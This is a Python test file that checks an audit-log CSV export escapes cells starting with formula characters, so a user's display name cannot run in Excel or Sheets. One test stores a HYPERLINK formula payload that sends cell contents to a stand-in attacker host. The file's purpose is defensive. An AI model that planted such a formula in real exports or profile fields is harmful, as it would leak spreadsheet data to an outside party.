"""The CSV export cannot smuggle a spreadsheet formula.

Split from ``test_export_csv.py`` (which is at the 300-line cap): that file
asks whether the export contains the right rows, this one asks whether opening
it is safe.
"""

from __future__ import annotations

import csv
import io

import httpx
from audit_log.constants import ACTION_UPDATED
from audit_log.models import AuditEntry
from users.models import User

EXPORT_URL = "/api/audit_log/export.csv"
_ENTITY_TYPE = "Widget"


async def _rows(client: httpx.AsyncClient, **params: str) -> list[dict[str, str]]:
    resp = await client.get(EXPORT_URL, params=params)
    assert resp.status_code == 200, resp.text
    return list(csv.DictReader(io.StringIO(resp.text)))


class TestFormulaInjection:
    """A spreadsheet evaluates a cell that starts with ``=``.

    ``entity_label`` and ``actor`` are user-controlled — a display name is
    whatever someone typed into it — so an export opened in Excel or Sheets
    would run whatever the attacker put in their profile. Everything else on
    the row is machine-generated, but the escape is applied per cell rather
    than per column so a future column cannot quietly reopen the hole.
    """

    async def test_a_formula_display_name_is_neutralised(
        self, app, authenticated_client: httpx.AsyncClient
    ) -> None:
        payload = '=HYPERLINK("http://evil.example/?"&A1,"Click me")'
        async with app.state.sm.db.session_factory() as session:
            user = User(
                email="formula@example.com",
                hashed_password="x",
                full_name=payload,
                is_active=True,
            )
            session.add(user)
            await session.commit()
            user_id = str(user.id)

        async with app.state.sm.db.session_factory() as session:
            session.add(
                AuditEntry(
                    entity_type=_ENTITY_TYPE,
                    entity_id="injected",
                    action=ACTION_UPDATED,
                    changes=[],
                    user_id=user_id,
                )
            )
            await session.commit()

        rows = await _rows(authenticated_client, entity_type=_ENTITY_TYPE)
        row = next(r for r in rows if r["entity_id"] == "injected")

        assert row["actor"] == f"'{payload}"

    def test_every_dangerous_lead_character_is_prefixed(self) -> None:
        from audit_log.export import escape_formula

        for lead in ("=", "+", "-", "@", "\t", "\r"):
            assert escape_formula(f"{lead}cmd") == f"'{lead}cmd"

    def test_ordinary_text_is_untouched(self) -> None:
        from audit_log.export import escape_formula

        assert escape_formula("Dana Rivera") == "Dana Rivera"
        assert escape_formula("") == ""
        assert escape_formula("2026-09-03T10:00:00+00:00") == "2026-09-03T10:00:00+00:00"
